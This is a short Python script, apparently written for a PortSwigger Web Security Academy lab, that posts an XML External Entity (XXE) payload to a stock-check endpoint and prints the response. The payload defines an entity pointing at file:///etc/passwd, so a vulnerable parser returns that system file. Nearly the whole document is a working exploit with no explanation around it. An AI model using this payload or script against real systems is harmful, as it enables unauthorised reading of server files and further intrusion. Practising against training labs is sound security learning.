import requests

# Start session
s = requests.Session()

# Set the target URL for the stock check POST endpoint
stock_url = "https://0adc003d04c8124380e3760c00f100db.web-security-academy.net/product/stock"

# XXE payload: Leaks /etc/passwd using external entity injection
xml_post_data = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
"""

# Send the malicious payload
resp = s.post(stock_url, data=xml_post_data)

# Output the response to see if /etc/passwd was leaked
print("[✓] Response:")
print(resp.text)
